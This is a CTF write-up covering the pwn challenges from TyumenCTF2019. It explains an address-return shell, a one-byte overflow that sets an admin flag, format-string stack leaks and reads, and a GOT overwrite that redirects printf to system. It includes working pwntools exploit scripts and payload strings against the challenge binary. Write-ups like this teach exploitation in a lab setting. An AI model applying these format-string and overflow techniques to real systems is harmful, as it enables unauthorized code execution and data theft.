TyumenCTF2019-writeups
======================

Writeups for some of the TyumenCTF2019 challenges (mainly the pwn ones)

License note: Most of the files in the folders `pwn/` and `joy` were issued by the TyumenCTF2019 Team.

# Table of Contents

1) **pwn**
    * [return my](#return_my)
    * [chat I](#chat1)
    * [chat II](#chat2)
    * [chat III](#chat3)
    * [chat IV](#chat4)

# Challenges

<a name="return_my"></a>

## return my

For this task you were given a binary (called *pwn*) and that's about it.

However this challenge turned out to be quite easy.

Inspecting the binary suggests an easy reverse engenieering task:
```
$ file pwn
pwn: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=348934655967dca186bcc8dc8ab74731eb7c4e3e, not stripped
```

When running the program, the application asks for user input:
```
$ ./pwn
Return my:
```

With some black-box testing, we get a lot of unsuccessful quits and some seg-faults:
```
$ ./pwn
Return my: asdf
$ # nothing happens
```
```
$ ./pwn
Return my: 123
[1]    4108 segmentation fault (core dumped)
```

This suggest that the given input is some kind of address.

Taking a closer look using a debugger confirms this guess.

When looking at the disassembled binary we can notice that there is a suspicious function called *TheNextEpisode*. So let's try entering its address (`0x400ad2`):
```
$ ./pwn
Return my: 4197074
```

When doing so you will notice that you have a shell :)


<a name="chat1"></a>

## chat I

The first of the chat series.

You were given the source of a chat application (go check it out in `pwn/chat/src.c`).

Thanks to the authors it was perfectly clear where to search for the first flag: `print_flag0(char* token)`.
This method gets called if the user is an admin or rather:
```c
    // in print_user(..)
    if (user->isAdmin == 1){
        print_flag0(user->token);
    }
```

So first things first: Go get familiar with the program, test things out etc.

Maybe you already came across the first vulnurability. The `user` struct is specified as follows:

```c
struct user{
    char token[10];
    char nick[10];
    int isAdmin;
};
```

However when taking a look at how information is parsed you can notice that the nickname read is 2 characters too long:

```c
void welcome(char *some_info){
    char token[10];
    char nick[12] = "";
    int user_id;

    // ..

    printf("Enter your nick: ");
    scanf("%11s", nick);

    // ..
}
```

This causes the *isAdmin* flag to be overwritten in the next copy step. You can easily test this by entering a nickname of length 11:

```
➜  chat ./chat ABABAABAABAA
Hello, guest!
Enter your token: ABCDEFGHI
Enter your nick: NNNNNNNNNNA

Welcome to our chat!

Select command:
    1) Join chat
    2) See user information
    3) Quit

>> 2

User info:
   Nick: 	NNNNNNNNNNA
   His token:	ABCDEFGHI
   isAdmin: 	65

Select command:
    1) Join chat
    2) See user information
    3) Quit

>>
```

As you can see the *isAdmin* has now the value 65 which is the equivalent of ASCII `A`.

So in order to get the first exploit working we only have to write a 1-byte as the eleventh character:

```bash
(python3 -c "print('ABCDEFGHI\n' + 'A'*10 + '\x01')" && cat) | ./chat AAAAAAAAAAA
```

Now when you try to view the user information you will notice that *isAdmin* indeed equals to 1 and the first flag will be printed to you :)


<a name="chat2"></a>

## chat II

As for the first challenge the method which yields the desired flag was also quite obvious:

```c
void change_info(char *info, char* token){
    char path[24] = "flags/flag1/";
    strcat(path, token);
    char *tokens[1];
    int cnt = read_lines(path, tokens);
    if (cnt == -1){
        return;
    }
    strcpy(info, tokens[0]);
    free(tokens[0]);
}
```

When tracing back the callstack you will notice that the argument `info` was `argv[1]` in *main* (this is also the reason why you need to pass an argument to the program when running it).
The method continues to write the flag back into it, so we now have to find a way to retrieve the flag.
The argument list is available on the stack and this is also the only place where this information is available after the method call.

Side note: There is also a subtle bug in the token recognition routine, which makes any token valid if there is no new line at the end of the *users.txt* file. If the token was longer we could also make use of a path traversal and abuse the vulnurability of *chat I*.

So how do we read memory from the stack? There are a few problems which arise:
1) We do not know how to access memory directly
2) We do not know where the flag is located on the stack

In order to overcome the first problem we have to find another vulnurability in the code. We can check for any more buffer overflows but we will not find any. Another usefull trick is to re-compile the program and eventually the compiler (the decent ones at least) will warn us about potential risks found.

When doing so we can see that the function `log_err` is vulnurable to a format string attack:
```c
void log_err(char *err){
    printf(ANSI_COLOR_RED "ERROR: " ANSI_COLOR_RESET);
    printf(err);  // <-- format string vuln here
    printf("\n");
}
```

We can easily control the `char *err` by entering an invalid chat command (i.e. a message which begins with `\` and is not followed by `q` or `n`).

Abusing this we can easily read any memory which is further down in the stack. Since the flag gets pushed on the stack quite early we should be able to read it.
However we still do not know where it is located and sadly there is no deterministic way (that I know of?) how to predict the position of the program argument on the stack.
An easy solution to this little problem is to simply read the whole stack :)
We can easily do so by continuously sending invalid chat messages with a direct parameter access string format, f.e.:
```
\%31$016lx
\%32$016lx
\%33$016lx
...
```

Note that we are running on a 64 bit system so we have to 8 byte addresses.

Since this process is quite time intensive I wrote a little script to automate the process and decode the memory on the fly:

```python
import sys
from pwn import *

def main():
    # con = remote('pwn.tyumenctf.ru', 2001)
    con = process(['./chat', 'A' * 24])
    log.info('PID %s' % util.proc.pidof(con)[0])

    con.recvuntil('token: ')
    # con.sendline('oBl2o9WCc')  # send token
    con.sendline('ABCDEFGHI')

    nick = 'XXXXX'
    con.recvuntil('nick: ')
    con.sendline(nick)  # send nickname

    con.recvuntil('>> ')
    con.sendline('1')

    for i in range(100, 10000):
        try:
            con.recvuntil(nick + ': ')
            con.sendline('\\%{}$016lx'.format(i))

            bs = con.recvline()[-17:-1].decode()
            bs = [ bs[j*2:j*2+2] for j in range(8) ]
            bs = list(map(lambda x: chr(int(x, 16)), bs))
            print(''.join(bs[::-1])) # note the reverse order because of endianess
        except:
            break

if __name__ == '__main__':
    main()
```

You can then easily pipe the output to a file or f.e. less and inspect the memory. Eventually you will find the flag somewhere :)


<a name="chat3"></a>

## chat III

The 3rd flag was quite similiar to the second one, though the flag is not stored on the stack:

```c
void flag2(char *token, char *dst){
    char path[24] = "flags/flag2/";
    strcat(path, token);
    char *tokens[1];
    int cnt = read_lines(path, tokens);
    if (cnt == -1){
        strcpy(dst, "Flag_Not_this_token");
        return;
    }
    strcpy(dst, tokens[0]);
    free(tokens[0]);
}

// ...

void chat_kisa(char *message, struct user* user){
    struct msg msg;
    strcpy(msg.msg, message);
    msg.time_created = time(NULL);
    flag2(user->token, msg.meta_inf);
    // ..
}

```

Basicly, whenever we send a chat message the 3rd flag gets added to the message's meta information.

When playing around a bit and inspecting the memory in a debugger you can notice that the flag is available on the stack for a *short* moment.
However it gets overwritten by subsequent calls to f.e. *log_err* or when exiting the chat.

A first approach could be to attempt the same thing we did for the second flag: Simply read the whole stack and eventually we will find the flag.
Though everytime we would have to *force* the flag onto the stack again by sending a junk chat message.

Sadly this will not work as the flag is in the wrong direction in memory. We can though read arbitrary memory with the string format vulnurability we discovered. To accomplish this we have to place our desired address on the stack and then read from it using the `%s` formatter.

But how do we know where the flag will be located? This is especially difficult because of the random memory layout. The one thing that is constant though is relative positioning. This means if we can somehow get access to one stack address we will have access to all of them (kinda).

Since we are already on a fixed (relative) position with the *printf* call, we only have to search the stack for an address which corresponds to an element on the stack. So let's take a look at the stack layout in the debugger:

```objdump
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdaf0 --> 0x555555555150 (<_start>:	endbr64)
0008| 0x7fffffffdaf8 --> 0x55555555a6d0 ("cmd is invalid: \\abc")
0016| 0x7fffffffdb00 --> 0x7fffffffdbc0 --> 0x7fffffffdbf0 --> 0x7fffffffdc40 --> 0x7fffffffdc60 --> 0x555555555f90 (<__libc_csu_init>:	endbr64)
0024| 0x7fffffffdb08 --> 0x555555555af7 (<start_chat+336>:	nop)
0032| 0x7fffffffdb10 --> 0x0
0040| 0x7fffffffdb18 --> 0x55555555a6b0 ("ABCDEFGHI")
0048| 0x7fffffffdb20 --> 0x300000d68
0056| 0x7fffffffdb28 --> 0x55555555a6d0 ("cmd is invalid: \\abc")
[------------------------------------------------------------------------------]
```

As we can see right before our malicious *printf* call a pretty good stack pointer approximation is located right in front of us (at `0x7fffffffdb00`).
We can now calculate the offset between this address and the address of the flag on the stack:

```objdump
gdb-peda$ find PPPP
Searching for 'PPPP' in: None ranges
Found 4 results, display max 4 items:
 [heap] : 0x55555555aa48 --> 0x5050505050 ('PPPPP')
[stack] : 0x7fffffffdab8 ('P' <repeats 13 times>)
```

The offset turns out to be 264 (`0x7fffffffdbc0 - 0x7fffffffdab8`).

We can now prepare our *attack*:
1) Read the approximated stack pointer
2) Calculate the address of our flag
3) Place the address on the stack
4) Send a junk message to force our flag onto the stack
5) Read from the previously prepared address

We already got the first 2. So the next question would be how to place the address onto the stack?

This actually turns out pretty easy as our inserted messages are placed on the stack:
```objdump
...
0040| 0x7fffffffdb28 --> 0x55555555a6d0 ("cmd is invalid: \\", 'A' <repeats 59 times>)
0048| 0x7fffffffdb30 ("\\", 'A' <repeats 59 times>)
0056| 0x7fffffffdb38 ('A' <repeats 52 times>)
```
The thing we have to care about is padding: We have to make sure the address is aligned correctly.

With the initial characters we cannot control (i.e. "*cmd is invalid: \\*") the initial padding has to be 7 bytes. After that every 8 bytes are useable. Naturally another problem arises: We cannot place null-bytes, as they are interpreted as string end characters. In order to overcome this problem we can either place our string formatter at the front and our address at the end or we can simply send two messages, first the address and after that our string formatter. As we will need this later, I chose the latter.

We can then align our `%s` formatter with the address on the stack using the direct parameter access like we did before.

Finally we can construct an exploit which may look like this:

```python
import sys
import struct
from pwn import *


def main():
    # con = remote('pwn.tyumenctf.ru', 2001)

    con = process(['./chat', 'A' * 24])
    log.info('PID %s' % util.proc.pidof(con)[0])

    con.recvuntil('token: ')
    con.sendline('ABCDEFGHI')  # send token
    # con.sendline('ucL9wGWpr')

    nick = 'XXXXX'

    con.recvuntil('nick: ')
    con.sendline(nick)  # send nickname

    con.recvuntil('>> ')
    con.sendline('1')

    # BEGIN EXPLOIT

    con.recvuntil(nick + ': ')
    con.sendline('JUNK')
    con.recvline()

    # step 1
    # guess current stack pointer
    con.recvuntil(nick + ': ')
    con.sendline('\\%8$016lx')
    stack_addr = con.recvline()[-17:-1].decode()
    stack_addr = int(stack_addr, 16)
    log.info('STACK ADDR %s' % hex(stack_addr))

    # step 2
    flag_addr = stack_addr - 264
    log.info('FLAG @ %s' % hex(flag_addr))

    # step 3
    # put the flag address on the stack
    # note that we add quite some padding in order
    # to not overwrite the address with our next call
    con.recvuntil(nick + ': ')
    payload = struct.pack('<Q', flag_addr)
    con.send('\\' + 7*'X' + 8*'X')
    con.sendline(payload)
    con.recvline()

    # step 4
    # send junk message to put flag on the stack again
    con.recvuntil(nick + ': ')
    con.sendline('JUNK')
    con.recvline()

    # step 5
    # read from the address we put on the stack before
    con.recvuntil(nick + ': ')
    con.sendline('\\%16$s')
    print(con.recvline())  # prints flag along some trash

    # END EXPLOIT

    # quit
    con.sendline('\\q')
    con.sendline('3')

if __name__ == '__main__':
    main()
```

<a name="chat4"></a>

## chat IV

The final pwn challenge: Exploit the chat program further to gain a shell.

Naturally one would think that we already have all the pieces we need:
We can read any memory and using the `%n` formatter we can also write any memory.

My first idea was to overwrite some addresses in the .got.plt section in order to return to libc and call f.e. `system('/bin/sh')`.
So let's make a plan on how to accomplish this:

In order overwrite this section we first have to know where it is located in memory. After that we need to know the address of any function in libc because we need to calculate the position of `__libc_system` (remember the random memory layout, only relative positions are constant). We then have to write the address of our call to a method call we can easily control. Finally we have to call the method.

Getting the address of the .got.plt section in memory is quite easy: We can use the same trick we used earlier, this time however instead of guessing the stack pointer, we want to guess the instruction pointer.

Again there is a handy address on the stack:
```objdump
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdaf0 --> 0x555555555150 (<_start>:	endbr64)
0008| 0x7fffffffdaf8 --> 0x55555555a6d0 ("cmd is invalid: \\", 'A' <repeats 59 times>)
0016| 0x7fffffffdb00 --> 0x7fffffffdbc0 --> 0x7fffffffdbf0 --> 0x7fffffffdc40 --> 0x7fffffffdc60 --> 0x555555555f90 (<__libc_csu_init>:	endbr64)
0024| 0x7fffffffdb08 --> 0x555555555af7 (<start_chat+336>:	nop)
[------------------------------------------------------------------------------]
```

We can see that the address of `<start_chat+336>` is located at `0x555555555af7`. We can easily read this memory using a `%x` formatter.

Now that we have the address we can think about a function to overwrite. Naturally a good function seems to be `printf` since we can easily control its input (at one point at least):
```c
void log_err(char *err){
    printf(ANSI_COLOR_RED "ERROR: " ANSI_COLOR_RESET);
    printf(err);  // <----
    printf("\n");
}
```

One thing we cannot control though is the leading backslash `\` we have to enter in order to branch into the error log. A quick test suggests that this is no problem tho:

```c
#include <stdlib.h>
int main() {
    system("\\/bin/sh");
    return 0;
}
```

This will still spawn our desired shell.

In order to fully control the input to `log_err` we also have to cheat the `strcat` function:
```c
// in start_chat
strcpy(err, "cmd is invalid: ");
log_err(strcat(err, message));
```

We can do this by overwriting the call to `strcat` by a call which simply returns the second argument. We could choose many I guess but I simply chose `strcpy`. It will copy our message into `err` and return it.

Putting it together our plan now looks like this:
1) Guess the current instruction pointer
2) Calculate the address of `printf` in .got.plt
3) Calculate the address of `strcat` in .got.plt
4) Read the address of (f.e.) `printf` from .got.plt
5) Calculate the address of `__libc_system` in libc
6) Calculate the address of `strcpy` in libc
7) Overwrite the address of `strcat` (in .got.plt) with the address of `strcpy`
8) Overwrite the address of `printf` (in .got.plt) with the address of `__libc_system`
9) Send chat message *\/bin/sh*

The first 6 steps are similiar to the exploit used for [chat III](#chat3) so I will not discuss them again here.

But overwriting the addresses requires a little bit more effort. There are a few things to watch out for. First we have to make sure that our write operation is *atomic*, i.e. completes with one call to `printf`, otherwise we will risk a segmentation fault (since the program will likely try to call into undefined memory). Second, since the addresses are quite large we have to write them byte by byte (well, we can also write 2 bytes each time)

Essentially this means we have to put at least 4 addresses on the stack before executing the write operation. Then this write operation must not corrupt our carefully prepared stack memory.

Again we cannot write all addresses at once because they likely contain null-bytes. This means we have to write them one after another, placing the one furthest down the stack first, because otherwise we would overwrite them again with our next call !

Also note that we have to use an 8 byte padding between each address, because the trailing null-byte which terminates the string would corrupt the next address otherwise.

Writing is then simply done using the `%n` formatter preceeded by a `%x` formatter of the desired width. Recall that we have to write the address at once, so we have to chain multiple `%n` into one command. This enforces us to write the smallest addresses first, because we will only print more bytes the further we proceed in the format chain.

Some of the details are left out but you can find the full exploit in the file `/pwn/chat/chat4.py`.
